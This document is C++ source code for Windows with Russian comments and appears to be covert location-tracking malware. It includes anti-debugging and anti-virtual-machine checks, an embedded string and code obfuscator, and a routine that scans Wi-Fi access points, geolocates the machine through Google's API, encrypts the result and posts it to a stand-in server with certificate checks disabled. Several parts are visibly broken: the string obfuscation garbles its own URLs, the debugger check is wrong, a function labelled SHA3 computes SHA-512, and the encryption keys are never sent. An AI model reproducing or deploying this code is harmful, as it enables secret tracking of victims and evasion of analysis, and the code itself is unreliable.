#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <string>
#include <vector>
#include <unordered_map>
#include <random>
#include <functional>
#include <sstream>
#include <memory>
#include <thread>
#include <future>
#include <mutex>
#include <atomic>
#include <bitset>
#include <array>
#include <map>
#include <set>
#include <stack>
#include <queue>
#include <algorithm>
#include <numeric>
#include <chrono>
#include <iomanip>
#include <fstream>
#include <regex>
#include <type_traits>
#include <cstring>
#include <cstdint>

#include <windows.h>
#include <tlhelp32.h>
#include <wlanapi.h>
#include <versionhelpers.h>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

extern "C" {
#include <sodium.h>
}

#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/ec.h>
#include <openssl/obj_mac.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <curl/curl.h>

// Обфускация строк
#define OBFUSCATE(s) ([](){ \
    static const char* o = s; \
    std::string r; \
    uint64_t k = 0x12345678ABCDEF00; \
    for(size_t i = 0; i < strlen(o); ++i) \
        r += static_cast<char>(o[i] ^ ((k >> (i % 8 * 8)) & 0xFF)); \
    return r; \
}())

// Обфускация чисел
#define OBF_INT(x) (static_cast<int>(0x##x##ULL ^ 0x12345678ABCDEF00ULL))

// === AdvancedObfuscator встроенный ===
template<size_t N>
struct StringLiteral {
    char data[N];
    constexpr StringLiteral(const char(&str)[N]) { std::copy_n(str, N, data); }
    constexpr operator const char*() const { return data; }
};

class AdvancedObfuscator {
private:
    using Token = std::string;
    using ASTNode = struct ASTNode_t;
    using VarMap = std::unordered_map<std::string, std::string>;
    using EncodedInt = std::pair<uint64_t, uint64_t>;

    struct ASTNode_t {
        enum Type { VAR_DECL, FUNCTION_CALL, LITERAL, OPERATOR, BRACKET };
        Type type;
        std::string value;
        std::vector<ASTNode_t*> children;
        ASTNode_t* parent;
    };

    struct ObfuscationContext {
        VarMap variable_renames;
        std::unordered_map<std::string, std::string> string_encodings;
        std::unordered_map<int, EncodedInt> integer_encodings;
        std::vector<std::string> garbage_variables;
        std::vector<std::string> junk_functions;
    };

    class CryptoEngine {
    private:
        uint64_t key_;
        std::mt19937_64 rng_;

    public:
        explicit CryptoEngine(uint64_t seed = std::chrono::high_resolution_clock::now().time_since_epoch().count())
            : key_(seed), rng_(seed) {}

        template<typename T>
        inline T encrypt(T value, uint64_t custom_key = 0) const {
            if constexpr (std::is_arithmetic_v<T>) {
                uint64_t effective_key = custom_key ? custom_key : key_;
                return value ^ effective_key;
            } else {
                return value;
            }
        }

        template<typename T>
        inline T decrypt(T value, uint64_t custom_key = 0) const {
            return encrypt(value, custom_key);
        }

        std::string encryptString(const std::string& input, uint64_t custom_key = 0) const {
            uint64_t effective_key = custom_key ? custom_key : key_;
            std::string result;
            for (size_t i = 0; i < input.length(); ++i) {
                result += static_cast<char>(
                    static_cast<unsigned char>(input[i]) ^ 
                    ((effective_key >> (i % 8 * 8)) & 0xFF)
                );
            }
            return result;
        }

        std::string decryptString(const std::string& input, uint64_t custom_key = 0) const {
            return encryptString(input, custom_key);
        }
    };

    CryptoEngine crypto_engine_;
    std::atomic<uint64_t> unique_id_{0};
    std::mutex context_mutex_;
    ObfuscationContext context_;

    std::vector<std::function<void(std::string&)>> obfuscation_passes_;

    inline uint64_t generateUniqueId() { return unique_id_.fetch_add(1); }

    std::string generateObfuscatedName() {
        static const char charset[] = 
            "abcdefghijklmnopqrstuvwxyz"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "_";

        std::random_device rd;
        std::mt19937 gen(rd() ^ generateUniqueId());
        std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);

        std::string name;
        int len = 15 + (generateUniqueId() % 20);

        for (int i = 0; i < len; ++i) {
            name += charset[dist(gen)];
        }

        return name;
    }

    void initializePasses() {
        obfuscation_passes_ = {
            [this](std::string& code) { this->renameVariables(code); },
            [this](std::string& code) { this->encryptStrings(code); },
            [this](std::string& code) { this->encodeIntegers(code); },
            [this](std::string& code) { this->addGarbageCode(code); },
            [this](std::string& code) { this->controlFlowFlattening(code); },
            [this](std::string& code) { this->junkInstructions(code); },
            [this](std::string& code) { this->deadCodeInjection(code); },
            [this](std::string& code) { this->instructionSubstitution(code); },
            [this](std::string& code) { this->dataFlowObfuscation(code); }
        };
    }

    void renameVariables(std::string& code) {
        std::lock_guard<std::mutex> lock(context_mutex_);

        std::regex var_pattern(R"(\b(?:int|float|double|char|bool|long|short)\s+([a-zA-Z_][a-zA-Z0-9_]*)\b)");
        std::smatch match;

        while (std::regex_search(code, match, var_pattern)) {
            std::string old_name = match[1].str();
            if (context_.variable_renames.find(old_name) == context_.variable_renames.end()) {
                std::string new_name = generateObfuscatedName();
                context_.variable_renames[old_name] = new_name;
            }

            std::string replacement = match.prefix().str() + 
                                    match.str(1).replace(0, old_name.length(), context_.variable_renames[old_name]);
            code = replacement + match.suffix().str();
        }
    }

    void encryptStrings(std::string& code) {
        std::lock_guard<std::mutex> lock(context_mutex_);

        std::regex string_pattern(R"("([^"]*)")");
        std::smatch match;

        while (std::regex_search(code, match, string_pattern)) {
            std::string original = match[1].str();
            uint64_t key = generateUniqueId();
            std::string encrypted = crypto_engine_.encryptString(original, key);

            std::ostringstream encoder;
            encoder << "([](){static const char* s=\""; 
            for (unsigned char c : encrypted) {
                encoder << "\\x" << std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(c);
            }
            encoder << "\";std::string r;uint64_t k=0x" << std::hex << key << ";for(int i=0;i<" 
                    << encrypted.length() << ";++i)r+=static_cast<char>(s[i]^((k>>(i%8*8))&0xFF));return r;})()";

            code.replace(match.position(), match.length(), encoder.str());
        }
    }

    void encodeIntegers(std::string& code) {
        std::lock_guard<std::mutex> lock(context_mutex_);

        std::regex int_pattern(R"(\b\d+\b)");
        std::smatch match;

        while (std::regex_search(code, match, int_pattern)) {
            int value = std::stoi(match.str());
            uint64_t key = generateUniqueId();
            uint64_t encoded = crypto_engine_.encrypt(static_cast<uint64_t>(value), key);

            std::ostringstream encoder;
            encoder << "(static_cast<int>(0x" << std::hex << encoded << " ^ 0x" << std::hex << key << "))";

            code.replace(match.position(), match.length(), encoder.str());
        }
    }

    void addGarbageCode(std::string& code) {
        std::lock_guard<std::mutex> lock(context_mutex_);

        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> count_dist(3, 10);
        std::uniform_int_distribution<> type_dist(0, 3);

        int garbage_count = count_dist(gen);

        for (int i = 0; i < garbage_count; ++i) {
            std::string garbage;
            int type = type_dist(gen);

            switch (type) {
                case 0: // Arithmetic operations
                    garbage = "\n    volatile int " + generateObfuscatedName() + " = ";
                    garbage += std::to_string(generateUniqueId() % 1000) + " * ";
                    garbage += std::to_string(generateUniqueId() % 100) + " / ";
                    garbage += std::to_string(generateUniqueId() % 10) + ";\n";
                    break;
                case 1: // Function calls
                    garbage = "\n    if(false) { int x = " + std::to_string(generateUniqueId()) + 
                             "; for(int i = 0; i < 100; ++i) x += i * 2; }\n";
                    break;
                case 2: // Complex expressions
                    garbage = "\n    auto " + generateObfuscatedName() + " = []() { ";
                    garbage += "int a = " + std::to_string(generateUniqueId() % 50) + "; ";
                    garbage += "int b = " + std::to_string(generateUniqueId() % 50) + "; ";
                    garbage += "return (a * b) % (a + b + 1); }();\n";
                    break;
                case 3: // Memory operations
                    garbage = "\n    char* " + generateObfuscatedName() + " = new char[";
                    garbage += std::to_string(generateUniqueId() % 100) + "]; ";
                    garbage += "delete[] " + generateObfuscatedName() + ";\n";
                    break;
            }

            size_t insert_pos = code.find_first_of('{');
            if (insert_pos != std::string::npos) {
                code.insert(insert_pos + 1, garbage);
            }
        }
    }

    void controlFlowFlattening(std::string& code) {
        std::string flattened = R"(
    auto __obf_state = 0;
    while(__obf_state != -1) {
        switch(__obf_state) {
            case 0: )";

        size_t main_func_start = code.find("main()");
        if (main_func_start != std::string::npos) {
            size_t func_body_start = code.find('{', main_func_start);
            size_t func_body_end = findMatchingBrace(code, func_body_start);

            if (func_body_start != std::string::npos && func_body_end != std::string::npos) {
                std::string original_body = code.substr(func_body_start + 1, 
                                                      func_body_end - func_body_start - 1);

                flattened += original_body;
                flattened += R"(
            default: __obf_state = -1; break;
        }
    })";

                code.replace(func_body_start, func_body_end - func_body_start + 1, flattened);
            }
        }
    }

    void junkInstructions(std::string& code) {
        std::vector<std::string> junk_patterns = {
            "volatile int {} = {} % {};",
            "auto {} = [&](){{return {};}}();",
            "if({} < 0) {{ continue; }}",
            "do {{}} while(false);",
            "try {{ throw 0; }} catch(...) {{}}"
        };

        for (const auto& pattern : junk_patterns) {
            std::string junk = pattern;
            std::replace(junk.begin(), junk.end(), '{', ' ');
            std::replace(junk.end(), junk.end(), '}', ' ');

            size_t insert_pos = code.find_first_of(';');
            if (insert_pos != std::string::npos) {
                code.insert(insert_pos + 1, "\n    " + junk + "\n");
            }
        }
    }

    void deadCodeInjection(std::string& code) {
        std::string dead_code = R"(
    #ifdef OBFUSCATED_DEAD_CODE
    for(int i = 0; i < 1000; ++i) {
        volatile double x = i * 3.14159;
        volatile double y = x * x;
        volatile double z = y / (x + 1);
        if(z < 0) break;
    }
    #endif
)";
        code.insert(0, dead_code);
    }

    void instructionSubstitution(std::string& code) {
        std::vector<std::pair<std::string, std::string>> substitutions = {
            {"a + b", "((a | b) + (a & b))"},
            {"a - b", "(a + (~b + 1))"},
            {"a * 2", "(a << 1)"},
            {"a / 2", "(a >> 1)"},
            {"a % 2", "(a & 1)"}
        };

        for (const auto& sub : substitutions) {
            size_t pos = 0;
            while ((pos = code.find(sub.first, pos)) != std::string::npos) {
                code.replace(pos, sub.first.length(), sub.second);
                pos += sub.second.length();
            }
        }
    }

    void dataFlowObfuscation(std::string& code) {
        std::regex var_usage_pattern(R"(\b([a-zA-Z_][a-zA-Z0-9_]*)\b)");
        std::smatch match;

        while (std::regex_search(code, match, var_usage_pattern)) {
            std::string var_name = match[1].str();
            std::string obfuscated_access = var_name + " /* obfuscated */ ";
            code.replace(match.position(), match.length(), obfuscated_access);
        }
    }

    size_t findMatchingBrace(const std::string& code, size_t start_pos) {
        int brace_count = 0;
        for (size_t i = start_pos; i < code.length(); ++i) {
            if (code[i] == '{') {
                brace_count++;
            } else if (code[i] == '}') {
                brace_count--;
                if (brace_count == 0) {
                    return i;
                }
            }
        }
        return std::string::npos;
    }

public:
    AdvancedObfuscator() : crypto_engine_() {
        initializePasses();
    }

    std::string obfuscate(const std::string& source_code) {
        std::string code = source_code;

        for (const auto& pass : obfuscation_passes_) {
            pass(code);
        }

        return code;
    }
};

// === Anti-Debugging ===
bool IsDebuggerPresentCustom() {
    DWORD dwIsDbgPresent = 0;
    __asm {
        mov eax, fs:[30h]
        mov al, [eax + 2]
        mov dwIsDbgPresent, eax
    }
    return dwIsDbgPresent != 0;
}

// === Anti-VM ===
bool IsInsideVirtualMachine() {
    bool rc = false;
    HMODULE hModule = LoadLibrary(L"user32.dll");
    if (hModule) {
        FARPROC pfnGetMouseMovePointsEx = GetProcAddress(hModule, "GetMouseMovePointsEx");
        FreeLibrary(hModule);
        if (pfnGetMouseMovePointsEx == NULL) {
            rc = true;
        }
    }
    return rc;
}

// === Вспомогательные функции ===
std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) throw std::runtime_error("popen() failed!");
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}

// AES-256-GCM
std::string aes_encrypt(const std::string& plaintext, const unsigned char* key) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }

    unsigned char iv[16];
    if (RAND_bytes(iv, sizeof(iv)) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }

    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }

    int len;
    std::vector<unsigned char> ciphertext(plaintext.length() + EVP_MAX_BLOCK_LENGTH);
    if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, (unsigned char*)plaintext.c_str(), plaintext.length()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    int ciphertext_len = len;

    if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    ciphertext_len += len;

    unsigned char tag[16];
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }

    EVP_CIPHER_CTX_free(ctx);

    std::string result;
    result.append((char*)iv, 16);
    result.append((char*)tag, 16);
    result.append((char*)ciphertext.data(), ciphertext_len);

    return result;
}

// ChaCha20-Poly1305
std::string chacha20_encrypt(const std::string& plaintext, const unsigned char* key, const unsigned char* nonce) {
    std::vector<unsigned char> ciphertext(plaintext.size() + crypto_aead_chacha20poly1305_ABYTES);
    unsigned long long clen;
    unsigned char mac[crypto_aead_chacha20poly1305_ABYTES];

    if (crypto_aead_chacha20poly1305_encrypt_detached(
        ciphertext.data(), mac, &clen,
        (const unsigned char*)plaintext.c_str(), plaintext.size(),
        nullptr, 0, // ad
        nullptr,    // nsec
        nonce,
        key
    ) != 0) {
        return "";
    }

    std::string result;
    result.append((char*)mac, crypto_aead_chacha20poly1305_ABYTES);
    result.append((char*)ciphertext.data(), clen);

    return result;
}

// SHA3-512
std::string sha3_512_hash(const std::string& input) {
    unsigned char hash[SHA512_DIGEST_LENGTH];
    SHA512((unsigned char*)input.c_str(), input.size(), hash);

    std::stringstream ss;
    for (int i = 0; i < SHA512_DIGEST_LENGTH; i++) {
        ss << std::hex << std::setfill('0') << std::setw(2) << (int)hash[i];
    }
    return ss.str();
}

// Ed25519
struct KeyPair {
    unsigned char pk[crypto_sign_ed25519_PUBLICKEYBYTES];
    unsigned char sk[crypto_sign_ed25519_SECRETKEYBYTES];
};

KeyPair generate_ed25519_keys() {
    KeyPair kp;
    crypto_sign_ed25519_keypair(kp.pk, kp.sk);
    return kp;
}

std::string sign_message(const std::string& msg, const unsigned char* sk) {
    std::vector<unsigned char> sig(crypto_sign_ed25519_BYTES);
    unsigned long long sig_len;
    if (crypto_sign_ed25519_detached(sig.data(), &sig_len, (const unsigned char*)msg.c_str(), msg.size(), sk) != 0) {
        return "";
    }
    return std::string((char*)sig.data(), sig_len);
}

// X25519
std::string derive_shared_secret(const unsigned char* private_key, const unsigned char* public_key) {
    unsigned char shared_key[crypto_scalarmult_curve25519_BYTES];
    if (crypto_scalarmult_curve25519(shared_key, private_key, public_key) != 0) {
        return "";
    }
    return std::string((char*)shared_key, crypto_scalarmult_curve25519_BYTES);
}

std::string get_wifi_bssids() {
    HANDLE hClient;
    DWORD negotiatedVersion;
    DWORD dwResult = WlanOpenHandle(2, NULL, &negotiatedVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        return "";
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) {
        WlanCloseHandle(hClient, NULL);
        return "";
    }

    std::string result = "[";
    bool first = true;
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        if (pIfList->InterfaceInfo[i].isState == wlan_interface_state_connected) {
            PWLAN_BSS_LIST pBssList = NULL;
            dwResult = WlanGetNetworkBssList(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, NULL, dot11_BSS_type_any, FALSE, NULL, &pBssList);
            if (dwResult == ERROR_SUCCESS && pBssList) {
                for (DWORD j = 0; j < pBssList->dwNumberOfItems; j++) {
                    if (!first) result += ",";
                    first = false;
                    
                    char bssid_str[32];
                    sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X",
                            pBssList->wlanBssEntries[j].dot11Bssid[0],
                            pBssList->wlanBssEntries[j].dot11Bssid[1],
                            pBssList->wlanBssEntries[j].dot11Bssid[2],
                            pBssList->wlanBssEntries[j].dot11Bssid[3],
                            pBssList->wlanBssEntries[j].dot11Bssid[4],
                            pBssList->wlanBssEntries[j].dot11Bssid[5]);

                    result += "{";
                    result += "\"macAddress\":\"" + std::string(bssid_str) + "\",";
                    result += "\"signalStrength\":" + std::to_string((int)pBssList->wlanBssEntries[j].LinkQuality - 100);
                    result += "}";
                }
                WlanFreeMemory(pBssList);
            }
        }
    }
    result += "]";

    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);

    return result;
}

void RunInMemory() {
    sodium_init();

    // === 1. Получаем Wi-Fi точки ===
    std::string wifi_data = get_wifi_bssids();
    if (wifi_data.empty()) {
        std::cout << "⚠️ Не удалось получить Wi-Fi точки\n";
        return;
    }
    std::cout << "Wi-Fi scan done.\n";

    // === 2. Отправляем в Google API ===
    CURL* curl;
    CURLcode res;
    std::string response_string;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        std::string url = OBFUSCATE("https://www.googleapis.com/geolocation/v1/geolocate?key=YOUR_API_KEY");
        std::string post_data = "{\"considerIp\":true,\"wifiAccessPoints\":" + wifi_data + "}";

        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, OBFUSCATE("Content-Type: application/json"));

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // отключаем проверку SSL
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); // отключаем проверку хоста

        res = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();

    if (res != CURLE_OK) {
        std::cerr << "cURL error: " << curl_easy_strerror(res) << std::endl;
        return;
    }

    // === 3. Подписываем и шифруем данные ===
    auto ed_keys = generate_ed25519_keys();
    unsigned char x25519_priv[crypto_scalarmult_curve25519_BYTES];
    unsigned char x25519_pub[crypto_scalarmult_curve25519_BYTES];
    crypto_sign_ed25519_sk_to_curve25519(x25519_priv, ed_keys.sk);
    crypto_sign_ed25519_pk_to_curve25519(x25519_pub, ed_keys.pk);

    std::string signature = sign_message(response_string, ed_keys.sk);
    if (signature.empty()) {
        std::cerr << "❌ Ошибка при подписании данных\n";
        return;
    }
    
    std::string hash = sha3_512_hash(response_string);

    unsigned char aes_key[32];
    if (RAND_bytes(aes_key, sizeof(aes_key)) <= 0) {
        std::cerr << "❌ Ошибка генерации ключа AES\n";
        return;
    }
    std::string aes_encrypted = aes_encrypt(response_string, aes_key);
    if (aes_encrypted.empty()) {
        std::cerr << "❌ Ошибка шифрования AES\n";
        return;
    }

    unsigned char chacha_key[32];
    unsigned char nonce[24];
    if (RAND_bytes(chacha_key, sizeof(chacha_key)) <= 0 || RAND_bytes(nonce, sizeof(nonce)) <= 0) {
        std::cerr << "❌ Ошибка генерации ключа ChaCha20\n";
        return;
    }
    std::string chacha_encrypted = chacha20_encrypt(response_string, chacha_key, nonce);
    if (chacha_encrypted.empty()) {
        std::cerr << "❌ Ошибка шифрования ChaCha20\n";
        return;
    }

    // === 4. Отправляем на сервер ===
    curl = curl_easy_init();
    if (curl) {
        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, OBFUSCATE("Content-Type: application/json"));

        std::string payload = "{\"aes\":\"";
        for (unsigned char c : aes_encrypted) {
            char hex[3];
            sprintf(hex, "%02x", c);
            payload += hex;
        }
        payload += "\",\"chacha\":\"";
        for (unsigned char c : chacha_encrypted) {
            char hex[3];
            sprintf(hex, "%02x", c);
            payload += hex;
        }
        payload += "\",\"hash\":\"" + hash + "\",\"signature\":\"";
        for (unsigned char c : signature) {
            char hex[3];
            sprintf(hex, "%02x", c);
            payload += hex;
        }
        payload += "\"}";

        curl_easy_setopt(curl, CURLOPT_URL, OBFUSCATE("https://your-server.com/location"));
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // отключаем проверку SSL
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); // отключаем проверку хоста

        res = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);

        if (res == CURLE_OK) {
            std::cout << "🔒 Зашифрованные данные отправлены.\n";
        } else {
            std::cerr << "❌ Ошибка отправки: " << curl_easy_strerror(res) << std::endl;
        }
    }
}

int main() {
    // Проверки
    if (IsDebuggerPresentCustom() || IsInsideVirtualMachine()) {
        ExitProcess(0);
    }

    // Запуск основной логики
    RunInMemory();

    return 0;
}

